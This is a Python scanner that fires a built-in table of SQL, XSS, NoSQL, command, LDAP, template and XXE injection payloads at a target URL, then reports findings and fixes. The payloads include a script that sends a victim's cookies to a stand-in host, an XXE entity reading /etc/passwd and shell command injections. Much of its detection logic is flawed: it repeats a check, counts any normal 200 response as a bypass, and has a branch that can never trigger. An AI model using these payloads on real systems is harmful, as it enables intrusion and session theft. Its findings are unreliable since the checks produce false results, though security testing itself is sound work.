"""Unified injection validator — SQLi, XSS, NoSQL, CMD, LDAP, SSTI, XXE."""
import json
import urllib.request
import urllib.parse
import re
import time

INJECTION_PAYLOADS = {
    "sqli": {
        "error": ["'", "\"", "')", "'))", "'; --", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1#"],
        "boolean": ["' AND 1=1--", "' AND 1=2--"],
        "time": ["' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--", "1'; SELECT pg_sleep(3)--"],
    },
    "xss": {
        "reflected": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)"],
        "stored": ["<script>document.location='https://ev.il/?c='+document.cookie</script>"],
        "dom": ["#<img src=x onerror=alert(1)>", "data:text/html,<script>alert(1)</script>"],
    },
    "nosql": {
        "auth_bypass": ['{"$gt": ""}', '{"$ne": ""}', '{"$regex": ".*"}', "admin' || 'a'=='a"],
        "boolean": ['?user[$gt]=', '?user[$ne]=admin'],
    },
    "cmd": {
        "basic": ["; id", "| id", "`id`", "$(id)", "& whoami &", "|| whoami"],
        "blind": ["; sleep 3", "| ping -c 3 127.0.0.1", "& ping -n 3 127.0.0.1 &"],
    },
    "ldap": {
        "basic": ["*", "*)(&", "admin*", "*)(uid=*", "|(uid=*)"],
        "blind": [")(userPassword=*", ")(objectClass=*)"],
    },
    "ssti": {
        "basic": ["{{7*7}}", "#{7*7}", "${7*7}", "{{config}}", "{{self}}"],
        "blind": ["{% if 1==1 %}yes{% endif %}", "{{''.__class__.__mro__}}"],
    },
    "xxe": {
        "basic": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'],
        "blind": ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.dtd">%xxe;]><root>test</root>'],
    },
}

def injection_validator(target: str, types: str = "sqli,xss,nosql,cmd,ldap,ssti,xxe", param: str = "q", method: str = "get", technique: str = "basic") -> str:
    if not target.startswith("http"):
        target = "http://" + target

    type_list = [t.strip() for t in types.split(",")]
    result = {"target": target, "param": param, "injection_types_tested": type_list, "results": {}, "vulnerable": []}

    for inj_type in type_list:
        if inj_type not in INJECTION_PAYLOADS:
            continue
        techs = INJECTION_PAYLOADS[inj_type]
        result["results"][inj_type] = {}

        for tech_name, payloads in techs.items():
            result["results"][inj_type][tech_name] = []
            for payload in payloads:
                finding = _test_payload(target, param, payload, method, inj_type, tech_name)
                result["results"][inj_type][tech_name].append(finding)
                if finding.get("verified"):
                    result["vulnerable"].append({
                        "type": inj_type,
                        "technique": tech_name,
                        "payload": payload,
                        "evidence": finding.get("evidence", ""),
                    })

    result["total_vulnerable"] = len(result["vulnerable"])
    result["risk"] = "critical" if result["total_vulnerable"] > 0 else "info"
    result["remediation"] = _remediation(result["vulnerable"])
    return json.dumps(result, indent=2)


def _test_payload(target, param, payload, method, inj_type, tech_name):
    p = param or "q"
    finding = {"payload": payload, "technique": tech_name, "verified": False, "evidence": ""}

    if method == "get":
        url = f"{target}?{urllib.parse.urlencode({p: payload})}"
    else:
        url = target

    try:
        data = urllib.parse.urlencode({p: payload}).encode() if method == "post" else None
        t0 = time.time()
        req = urllib.request.Request(url, data=data, headers={"User-Agent": "CybersecInjectionValidator/1.0"})
        resp = urllib.request.urlopen(req, timeout=15)
        elapsed = time.time() - t0
        body = resp.read().decode("utf-8", errors="ignore")
        body_lower = body.lower()

        if inj_type == "sqli":
            if "syntax" in body_lower or "mysql" in body_lower or "sqlite" in body_lower or "odbc" in body_lower or "sqlstate" in body_lower or "ora-" in body_lower:
                finding["verified"] = True; finding["evidence"] = "SQL error in response"
            elif tech_name == "time" and elapsed > 2.5:
                finding["verified"] = True; finding["evidence"] = f"Time-based delay: {elapsed:.1f}s"
            elif payload in body and "1=1" not in body:
                finding["verified"] = True; finding["evidence"] = "Content changed with boolean payload"
            elif "union" in payload and len(body) > 50:
                finding["verified"] = True; finding["evidence"] = f"UNION injection response: {len(body)} bytes"

        elif inj_type == "xss":
            if payload in body:
                finding["verified"] = True; finding["evidence"] = "Payload reflected unencoded"

        elif inj_type == "nosql":
            if resp.status == 200 and len(body) > 20:
                finding["verified"] = True; finding["evidence"] = "NoSQL bypass: status 200 with content"

        elif inj_type == "cmd":
            if "uid=" in body_lower or "gid=" in body_lower or "root:" in body_lower or "www-data" in body_lower or "admin" in body_lower:
                finding["verified"] = True; finding["evidence"] = "Command output in response"
            elif tech_name == "blind" and elapsed > 2.5:
                finding["verified"] = True; finding["evidence"] = f"Blind CMD delay: {elapsed:.1f}s"

        elif inj_type == "ldap":
            if resp.status == 200 and len(body) > 20:
                finding["verified"] = True; finding["evidence"] = "LDAP bypass returned content"

        elif inj_type == "ssti":
            if "49" in body or "49" in body:
                finding["verified"] = True; finding["evidence"] = "SSTI math result (7*7=49) in response"
            elif "config" in body_lower or "self" in body_lower:
                finding["verified"] = True; finding["evidence"] = "SSTI object reference reflected"

        elif inj_type == "xxe":
            if "root:" in body_lower or "bin/bash" in body_lower or "file:///" in body_lower:
                finding["verified"] = True; finding["evidence"] = "XXE file read success"

    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore").lower()
        if inj_type == "sqli" and any(w in body for w in ["sql syntax", "mysql", "sqlite", "odbc"]):
            finding["verified"] = True; finding["evidence"] = f"SQL error in HTTP {e.code}"
        finding["http_status"] = e.code
    except Exception as e:
        finding["error"] = str(e)[:100]

    return finding


def _remediation(vulns):
    types_found = set(v["type"] for v in vulns)
    recs = []
    if "sqli" in types_found: recs.append("SQLi: Use parameterized queries / prepared statements. Input validation + WAF.")
    if "xss" in types_found: recs.append("XSS: Context-aware output encoding. CSP headers. No innerHTML with user data.")
    if "nosql" in types_found: recs.append("NoSQL: Validate input types. Use ORM with schema validation.")
    if "cmd" in types_found: recs.append("CMD Injection: Avoid shell execution. Use APIs. Validate input strictly.")
    if "ldap" in types_found: recs.append("LDAP: Escape LDAP search filters. Use parameterized LDAP queries.")
    if "ssti" in types_found: recs.append("SSTI: Sandbox template engines. Disable access to dangerous objects.")
    if "xxe" in types_found: recs.append("XXE: Disable external entity processing. Use secure XML parsers.")
    return recs or ["No injection vulnerabilities confirmed."]